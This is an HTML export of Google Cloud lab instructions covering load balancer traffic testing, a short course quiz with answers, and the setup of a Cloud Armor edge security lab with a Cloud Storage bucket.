CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; - backendService: regions/Region/backendServices/green-service</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; weight: 30</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h5 id='configure-the-default-routing-rule'><strong><span>Configure the default routing rule</span></strong></h5><p><span>When traffic does not match any of the other routing rules, the load balancer uses the default routing rule. Even though the rule you configured is designed to match all traffic, the default routing rule is required. You will configure the default routing rule to use the blue-service backend.</span></p><ol start='' ><li><p><span>Click </span><strong><span>(Default) Route traffic to backend &quot;&quot; for any unmatched hosts</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Edit host and path rule</span></strong><span> panel, for </span><strong><span>Service</span></strong><span>, select </span><strong><span>blue-service</span></strong><span>, and then click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h5 id='configure-the-frontend'><strong><span>Configure the frontend</span></strong></h5><p><span>The frontend forwards traffic to the backends.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>subnet-b</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Ephemeral (Custom)</span></td></tr><tr><td style='text-align:left;' ><span>Custom ephemeral IP address</span></td><td style='text-align:left;' ><span>10.10.30.5</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h5 id='review-and-create-the-load-balancer'><strong><span>Review and create the load balancer</span></strong></h5><ol start='' ><li><p><span>(Optional) Click </span><strong><span>Review and finalize</span></strong><span>. Review the </span><strong><span>Backend</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span>
<span>Wait for the load balancer to be created before starting the next task.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure the load balancer.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-test-the-load-balancer'><span>Task 3. Test the load balancer</span></h4><p><span>Verify that the </span><em><span>my-ilb</span></em><span> IP address forwards most of the traffic to the </span><em><span>blue-service</span></em><span> running on </span><em><span>instance-group-1</span></em><span> in </span><em><code>Zone 1</code></em><span>.</span></p><h5 id='access-the-load-balancer'><strong><span>Access the load balancer</span></strong></h5><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>utility-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>To verify that the load balancer forwards traffic, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-2-1zn8&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: YOUR_LAB_ZONE</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>As expected, traffic is forwarded from the load balancer (10.10.30.5) to either the blue-service backend or the green-service backend.</span></p><ol start='' ><li><p><span>Run the same command a few times:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p>&nbsp;</p><p><span>Most responses should come from </span><em><span>instance-group-1</span></em><span> in </span><code>Zone 1</code><span>, which is the blue-service. Fewer responses come from </span><em><span>instance-group-2</span></em><span> in </span><code>Zone 2</code><span>, which is the green-service. (Recall that you configured the load balancer to route 70% of the traffic to the blue-service.) If you do not see that most responses come from </span><em><span>instance-group-1</span></em><span>, run the commands again.</span></p><h4 id='task-4-review'><span>Task 4. Review</span></h4><p><span>In this lab, you created two managed instance groups in the </span><code>Region</code><span> region. You also created some firewall rules. The firewall rules allow traffic from clients and the health checkers to the managed instance groups. You configured a regional internal Application Load Balancer, using the managed instance groups as backends. Finally, you tested the load balancer to ensure that it works as expected.</span></p><p>&nbsp;</p><h3 id='quiz-11'><span>Quiz</span></h3><ol start='' ><li><p><span>Where would you configure traffic management for a load balancer?</span></p></li></ol><ul><li><p><span>In the load balancer frontend</span></p></li><li><p><span>In the load descriptor</span></p></li><li><p><span>In the load balancer backend</span></p></li><li><p><strong><span>In the URL map</span></strong></p></li></ul><p><span>Correct. The URL map contains rules that define the criteria to use to route incoming traffic to a backend service.</span></p><ol start='2' ><li><p><span>You can use hybrid load balancing to connect these environments:</span></p></li></ol><ul><li><p><strong><span>Google Cloud, other public clouds, and on-premises</span></strong></p></li><li><p><span>Google Cloud, AWS, and on-premises</span></p></li><li><p><span>Google Cloud and on-premises</span></p></li><li><p><span>Google Cloud and AWS</span></p></li></ul><p><span>Correct. You can connect any destination that you can reach by using a  Google hybrid connectivity product and that can be reached with a valid  IP:Port combination.</span></p><ol start='3' ><li><p><span>When you use the internal IP address of the forwarding rule to specify an internal Network Load Balancer next hop, the load balancer can only be:</span></p></li></ol><ul><li><p><span>In the same subnet as the next hop route or a Shared VPC network.</span></p></li><li><p><span>In the same subnet as the next hop route.</span></p></li><li><p><span>In the same VPC network as the next hop route.</span></p></li><li><p><strong><span>In the same VPC network as the next hop route or in a peered VPC network.</span></strong></p></li></ul><p><span>Correct. When you use an internal IP address to specify the next hop,  the load balancer can be in the same VPC network or a peered VPC  network.</span></p><p>&nbsp;</p><p>&nbsp;</p><h2 id='caching-and-optimizing-load-balancing'><span>Caching and Optimizing Load Balancing</span></h2><h3 id='lab---defending-edge-cache-with-cloud-armor'><span>LAB - Defending Edge Cache with Cloud Armor</span></h3><h4 id='overview-7'><span>Overview</span></h4><p><a href='https://cloud.google.com/armor'><span>Google Cloud Armor</span></a><span> </span><a href='https://cloud.google.com/armor/docs/security-policy-overview#edge-policies'><span>edge security policies</span></a><span> allow you to restrict access to cached objects on </span><a href='https://cloud.google.com/cdn'><span>Cloud CDN</span></a><span> (Content Delivery Network) and Cloud Storage. Edge security policies are deployed and enforced at the outermost perimeter of Google&#39;s network, upstream of where the Cloud CDN cache resides. Reasons to do this include ensuring that your users do not access objects in storage buckets from restricted geographies, or ensuring that your media distribution is filtering on the geographies that you have a license to do so.</span></p><p><span>In this lab you create a Google Cloud Storage bucket, upload an image to it, bind it to a load balancer, and then enable Cloud CDN and Cloud Armor edge security policies on it.</span></p><h5 id='what-youll-learn'><span>What you&#39;ll learn</span></h5><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Set up a Cloud Storage Bucket with cacheable content</span></p></li><li><p><span>Create an edge security policy to protect the content</span></p></li><li><p><span>Validate that the edge security policy is working as expected</span></p></li></ul><h4 id='setup-and-requirements-5'><span>Setup and requirements</span></h4><h5 id='before-you-click-the-start-lab-button-3'><span>Before you click the Start Lab button</span></h5><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h5 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console'><span>How to start your lab and sign in to the Google Cloud console</span></h5><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h5 id='before-you-begin'><span>Before you begin</span></h5><ul><li><p><span>In Cloud Shell, set your Project ID and create an environment variable for it:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set project $PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><h4 id='task-1-create-a-cloud-storage-bucket-and-upload-an-object'><span>Task 1. Create a Cloud Storage bucket and upload an object</span></h4><p><span>The Cloud Storage bucket will be the origin source for Cloud CDN.</span></p><ol start='' ><li><p><span>In the console, go to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>)</span></strong><span> &gt; </span><strong><span>Cloud Storage</span></strong><span> &gt; </span><strong><span>Buckets</span></strong><span>.</span></p></li><li><p><span>To create a new Cloud Storage bucket, click </span><strong><span>CREATE</span></strong><span>.</span></p></li><li><p><span>Set the bucket name as </span><code>Bucket Name</code></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location type</span></strong><span>, select </span><code>Region</code><span>, and choose </span><code>Bucket Region</code></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>The default storage class for your bucket is </span><code>Standard</code><span>. Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Uncheck </span><code>Enforce public access prevention on this bucket</code><span> checkbox under </span><strong><span>Prevent public access</span></strong><span>.</span></p></li><li><p><span>Choose </span><strong><span>Fine-grained</span></strong><span> under </span><strong><span>Access Control</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>That&#39;s it — you&#39;ve just created a Cloud Storage bucket!</span></p><h5 id='upload-an-object-to-the-bucket'><span>Upload an Object to the bucket</span></h5><p><span>Now upload an object into the bucket, which you will use later. By default, Cloud Storage buckets are private. As part of this lab, you will make the object available to the Internet.</span></p><ol start='' ><li><p><span>Run the following command in Cloud Shell, to download an image to Cloud Shell. A Google image from the Google homepage is used for this lab.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget --output-document google.png https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Use the </span><code>gsutil cp</code><span> command to upload the image from the Cloud Shell to the bucket you created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp google.png gs://Bucket Name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Remove the downloaded image from Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Locate the object you have uploaded to the bucket by navigating to </span><strong><span>Cloud Storage &gt; Buckets &gt; </span><code>Bucket Name</code></strong><span>.</span></p></li><li><p><span>Now, click on the three dots on the right side of the object you uploaded and click </span><strong><span>Edit access</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Add Entry</span></strong><span> and set the entity as </span><strong><span>Public</span></strong><span> from the drop-down list.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><img src="images/b7J%2FDa%2FQs1ii9RJbtLB9PEBijeY9rdhukZsgf0V76Y0%3D.png" referrerpolicy="no-referrer" alt="Edit access page, which lists the entities and includes the Save and Cancel buttons"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Cloud Storage Bucket and upload an object</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-create-a-load-balancer'><span>Task 2. Create a Load Balancer</span></h4><p><span>Cloud CDN and Cloud Armor are components that can be tied to Google&#39;s global 